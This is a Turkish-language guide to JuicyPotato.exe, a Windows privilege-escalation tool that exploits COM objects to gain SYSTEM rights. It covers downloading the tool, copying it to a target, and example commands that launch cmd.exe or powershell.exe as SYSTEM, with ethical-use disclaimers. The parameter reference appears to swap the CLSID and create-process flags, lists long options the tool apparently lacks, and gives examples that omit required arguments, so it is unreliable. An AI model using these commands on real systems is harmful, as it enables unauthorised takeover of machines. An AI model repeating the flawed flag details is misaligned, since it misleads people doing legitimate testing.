# JuicyPotato.exe Kullanım Rehberi

## JuicyPotato.exe Nedir?

**JuicyPotato.exe**, Windows ortamında yetki yükseltme (privilege escalation) saldırıları gerçekleştirmek için kullanılan bir araçtır. Windows işletim sistemlerinde yer alan **COM (Component Object Model)** nesnelerinin yanlış yapılandırmalarından faydalanarak, düşük yetkili bir kullanıcıdan SYSTEM yetkilerine geçiş yapılmasını sağlar. Bu araç, **RottenPotato** ve benzeri yöntemlerin daha geniş sürümlerinden biridir ve yalnızca belirli Windows sürümleri ve yapılandırmalarında çalışır.

> **Önemli Not:** JuicyPotato.exe yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Ana Özellikleri

1. **SYSTEM Yetkisi Elde Etme:**
   - Düşük yetkili bir kullanıcı oturumundan SYSTEM seviyesine geçiş yapar.
2. **COM Nesnelerini Kullanma:**
   - Windows sistemlerinde bulunan COM nesnelerini istismar eder.
3. **Yaygın Windows Desteği:**
   - Çeşitli Windows sürümlerinde çalışabilir.

---

## İndirme ve Çalıştırma

JuicyPotato.exe, GitHub üzerinden indirilebilir:

- [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

### Çalıştırma Adımları

1. **Dosyayı Edinin:**
   JuicyPotato.exe’yi indirin ve hedef sisteme kopyalayın.

2. **CMD veya PowerShell Üzerinden Çalıştırma:**
   ```cmd
   JuicyPotato.exe <parametreler>
   ```

---

## Kullanım Parametreleri

### 1. **`-l` veya `--listen`**
- Bağlantıların dinleneceği portu belirtir.

  **Kullanım:**
  ```cmd
  JuicyPotato.exe -l 1337
  ```

### 2. **`-p` veya `--prog`**
- SYSTEM yetkileriyle çalıştırılacak programı belirtir.

  **Kullanım:**
  ```cmd
  JuicyPotato.exe -p "cmd.exe"
  ```

### 3. **`-t` veya `--clsid`**
- İstismar edilecek COM nesnesinin CLSID'sini belirtir.

  **Kullanım:**
  ```cmd
  JuicyPotato.exe -t {4991d34b-80a1-4291-83b6-3328366b9097}
  ```

### 4. **`-c` veya `--createprocess`**
- Yeni bir işlem başlatır ve SYSTEM yetkileriyle çalıştırır.

  **Kullanım:**
  ```cmd
  JuicyPotato.exe -c "powershell.exe"
  ```

### 5. **`-h` veya `--help`**
- Tüm komutlar ve parametreler hakkında bilgi sağlar.

  **Kullanım:**
  ```cmd
  JuicyPotato.exe -h
  ```

---

## Örnek Kullanım Senaryoları

### 1. SYSTEM Yetkisi ile Komut İstemi Açma
```cmd
JuicyPotato.exe -p "cmd.exe" -l 1337
```

### 2. Belirli Bir COM Nesnesini Kullanarak Yetki Yükseltme
```cmd
JuicyPotato.exe -t {4991d34b-80a1-4291-83b6-3328366b9097} -p "powershell.exe"
```

### 3. Yeni Bir Sistem Süreci Başlatma
```cmd
JuicyPotato.exe -c "notepad.exe"
```

### 4. Yardım Mesajını Görüntüleme
```cmd
JuicyPotato.exe -h
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** JuicyPotato.exe yalnızca yetkili güvenlik uzmanları tarafından kullanılmalıdır.
- **Test Ortamı:** Üretim sistemlerinde çalıştırmadan önce test ortamında denenmelidir.
- **Sistem Logları:** Araç, SYSTEM yetkisiyle çalıştığı için aktiviteler loglara kaydedilebilir.

---

## Kaynaklar

- [JuicyPotato GitHub Sayfası](https://github.com/ohpe/juicy-potato)
- [COM Nesneleri Hakkında Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/com/)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
